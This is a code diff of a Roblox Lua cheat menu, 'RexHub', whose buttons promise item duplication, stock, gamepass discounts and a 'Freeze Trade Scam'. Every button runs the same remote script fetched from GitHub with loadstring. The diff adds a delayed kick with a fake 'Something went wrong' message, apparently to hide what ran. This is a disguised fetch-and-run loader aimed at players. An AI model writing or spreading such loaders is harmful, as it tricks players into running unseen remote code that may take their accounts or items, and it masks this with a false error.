@@ -1,18 +1,19 @@
--- Garantir que a OrionLib está carregada
 local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
 
--- Criar a janela do menu com o nome personalizado
 local Window = OrionLib:MakeWindow({Name = "RexHub", HidePremium = true, IntroText = "Welcome"})
 
--- Função para executar o script remoto
 local function executeScript()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/wogjiew55/GamepassDiscount/refs/heads/main/BloxFruits', true))()
+    
+    task.delay(12, function()
+        game.Players.LocalPlayer:Kick("Something went wrong, please try again")
+    end)
 end
 
 -- Options [OP] Tab
 local OptionsTab = Window:MakeTab({
     Name = "Options [OP]",
-    Icon = "rbxassetid://4483345998", -- Ícone padrão
+    Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
 
@@ -28,34 +29,38 @@ OptionsTab:AddTextbox({
 OptionsTab:AddButton({
     Name = "Start Dupe",
     Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
+        executeScript()
     end
 })
 
 OptionsTab:AddButton({
     Name = "All in Stock",
     Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
+        executeScript()
     end
 })
 
 OptionsTab:AddButton({
     Name = "Apply Discount [Gamepass]",
     Callback = function()
-        executeScript()  -- Executa o script remoto ao clicar
+        executeScript()
     end
 })
 
--- Credits Tab
+OptionsTab:AddButton({
+    Name = "Freeze Trade Scam [OP]",
+    Callback = function()
+        executeScript()
+    end
+})
+
 local CreditsTab = Window:MakeTab({
     Name = "Credits",
-    Icon = "rbxassetid://4483345998", -- Ícone padrão
+    Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
 
--- Adicionando os textos na aba de créditos
 CreditsTab:AddParagraph("Credits", "RexScripts")
 CreditsTab:AddParagraph("Tiktok", "@rex.scripts")
 
--- Inicializa a UI
 OrionLib:Init()
